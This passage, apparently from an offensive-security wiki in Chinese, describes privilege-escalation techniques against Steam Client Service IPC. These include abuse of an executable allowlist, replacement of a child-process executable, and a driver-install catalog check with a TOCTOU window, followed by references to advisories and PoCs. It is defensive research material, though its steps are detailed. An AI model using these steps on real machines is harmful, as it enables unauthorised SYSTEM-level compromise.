不要只停留在枚举 named pipe。SYSTEM broker 可以开放权限宽松的 named **file mapping** 用于连接设置，然后将匿名 pipe 句柄复制到请求进程中。在 Steam 的测试设计中，`Global\SteamClientService_SharedMemFile` 和 `Global\SteamClientService_SharedMemLock` 协调客户端 PID/event 握手；服务返回两个 pipe 句柄，后续带长度前缀的请求使用 `RunInterface`（`0x01`）。该 mapping 的 DACL 允许任何 integrity level 的客户端访问。`steamclient64.dll` 中的内部 `CSteamServiceWin32` 对象提供了实用的客户端：解析特定 build 的全局变量，调用 vtable slot 0 的 `Connect`，然后使用 interface maps，而不是重新实现握手。能够访问 IPC 只是前提；是否发生提权取决于特权 handler 的信任判断。 <sup>[[19]](#references)[[20]](#references)</sup>

### 已签名清单扩展为过时的可执行文件 allowlist

`IClientInstallUtils::AddInstallScriptToWhiteList`（slot 21）会验证已签名 VDF 的 `kvsignatures`，但记录的是**扩展后的可执行文件路径名**，而不是不可变的文件身份。对于类似 `%INSTALLDIR%\Binaries\Prerequisites\vcredist_x86_vs2008sp1.exe` 的已签名 `Run Process` 条目，提供一个用户可写的 `%INSTALLDIR%`。在该精确扩展路径放置替换的可执行文件，然后调用 `RunInstallScript`（slot 22），传入 `Process 1` 指向该 allowlist 路径的未签名 VDF。该条目会一直保留到服务重启；据报告所述的实现，在以 SYSTEM 启动前不会重新验证文件。植入文件名必须与实际的已签名条目匹配，不能只匹配 prerequisite 类别。 <sup>[[19]](#references)[[20]](#references)</sup>

### Module-manager 子进程绕过直接加载时的签名检查

`IClientModuleManager::LoadModule`（slot 0）会在提供的 ID 与其 CRC32 匹配时接受模块字节。带有 `flags & 8` 的 `CallFunctionAsync`（slot 3）会选择**子进程**分支，而不是会验证 Valve 签名的直接 reflective-load 分支。服务会写入 `legacycompat\servicecall_<CRC>.dll`，并从安装目录启动 `legacycompat\steamservice.exe /runfunc ...`。如果该目录可由用户写入，可在后一个路径放置可执行文件，加载任意 CRC 匹配的临时模块，并调用设置了 bit 3 的 async 方法。据报告所述的 build，子进程可执行文件和写入磁盘的 DLL 均未经过认证。模块本身不必是可用的 payload：真正以 SYSTEM 运行的是被替换的子进程可执行文件。 <sup>[[19]](#references)[[20]](#references)</sup>

### 特权驱动程序安装前的 catalog 成员检查

对于驱动安装 broker，请检查其 catalog 验证是否绑定到**传给安装程序的确切 INF**。在报告所述的 `InstallVrLinkDongleDriver` 路径中，`WinVerifyTrust` 会验证 catalog，`CryptCATAdminCalcHashFromFileHandle` 会在调用者提供的目录中查找*至少一个*匹配文件，但随后服务会对 `netrtwlanuval.inf` 运行 `pnputil /add-driver ... /install`，却未确认该 INF 是预期的 catalog 成员。服务接受平面目录或特定架构的目录。因此，只要签名 catalog 中有任意一个目录成员匹配，就可能通过服务的弱检查，即使交给特权安装程序的 INF 是另一个文件。不要假设这本身就能绕过 Windows 驱动签名策略：能否成功安装仍取决于替换的软件包和主机策略。 <sup>[[19]](#references)[[20]](#references)</sup>

服务会在 `pnputil` 打开 INF 前释放其验证句柄，因此这里存在一个 [TOCTOU gap](#1-toctou-inside-updater-copyexecute-paths-msi-center-cmd_autoupdatesdk)，攻击落点是驱动安装，而非可执行文件更新。可以利用 oplock 在检查与安装程序打开文件之间安排替换。相同的 IPC 还提供[安全桌面输入转发](../authentication-credentials-uac-and-efs/uac-user-account-control.md#secure-desktop-input-forwarded-through-a-writable-shared-memory-ring)，但需要满足单独的同意前提。 <sup>[[19]](#references)</sup>

## References
- [1] [安全公告——Netskope Client for Windows——通过 Rogue Server 实现本地提权（CVE-2025-0309）](https://blog.amberwolf.com/blog/2025/august/advisory---netskope-client-for-windows---local-privilege-escalation-via-rogue-server/)
- [2] [Netskope 安全公告 NSKPSA-2025-002](https://www.netskope.com/resources/netskope-resources/netskope-security-advisory-nskpsa-2025-002)
- [3] [NachoVPN – Netskope 插件](https://github.com/AmberWolfCyber/NachoVPN)
- [4] [UpSkope – Netskope IPC 客户端/漏洞利用工具](https://github.com/AmberWolfCyber/UpSkope)
- [5] [NVD – CVE-2025-0309](https://nvd.nist.gov/vuln/detail/CVE-2025-0309)
- [6] [SensePost – 攻破 ASUS DriverHub、MSI Center、Acer Control Centre 和 Razer Synapse 4](https://sensepost.com/blog/2025/pwning-asus-driverhub-msi-center-acer-control-centre-and-razer-synapse-4/)
- [7] [0xdf – HTB：NanoCorp](https://0xdf.gitlab.io/2026/06/20/htb-nanocorp.html)
- [8] [SEC Consult – 通过 Checkmk Agent 中可写文件实现本地提权](https://sec-consult.com/vulnerability-lab/advisory/local-privilege-escalation-via-writable-files-in-checkmk-agent/)
- [9] [Checkmk Werk #16361 – Windows agent 中的提权漏洞](https://checkmk.com/werk/16361)
- [10] [sensepost/bloatware-pwn PoC](https://github.com/sensepost/bloatware-pwn)
- [11] [CyberArk PipeViewer](https://github.com/cyberark/PipeViewer)
- [12] [Unit 42 – 国家级攻击者利用 Notepad++ 供应链](https://unit42.paloaltonetworks.com/notepad-infrastructure-compromise/)
- [13] [Notepad++ – 基础设施遭劫持事件更新](https://notepad-plus-plus.org/news/hijacked-incident-info-update/)
- [14] [AmberWolf – 绕过 CVE-2025-0309 在 Netskope Client for Windows 中的修复](https://blog.amberwolf.com/blog/2026/march/patch-bypass---netskope-client-for-windows---local-privilege-escalation-via-rogue-server/)
- [15] [Atredis – 揭示 Lenovo Vantage 中的提权漏洞](https://www.atredis.com/blog/2025/7/7/uncovering-privilege-escalation-bugs-in-lenovo-vantage)
- [16] [Quarkslab – MyReport Updater：从 gRPC 到 SYSTEM](https://blog.quarkslab.com/myreport-updater-from-grpc-to-system.html)
- [17] [ManageEngine Threat Analysis Lab – AOMEI Backupper 供应链入侵](https://www.manageengine.com/threat-analysis-lab/aomei-backupper-supply-chain-compromise.html)
- [18] [Google Threat Intelligence Group 和 Mandiant – 调查短暂的供应链篡改事件](https://cloud.google.com/blog/topics/threat-intelligence/investigating-ephemeral-supply-chain-tampering)
- [19] [Atredis – 撬动 Valve](https://atredis.com/blog/2026/10/28/turning-the-valve)
- [20] [Atredis – Turning the Valve PoC](https://github.com/atredispartners/proof-of-concept/tree/main/turning-the-valve/code)
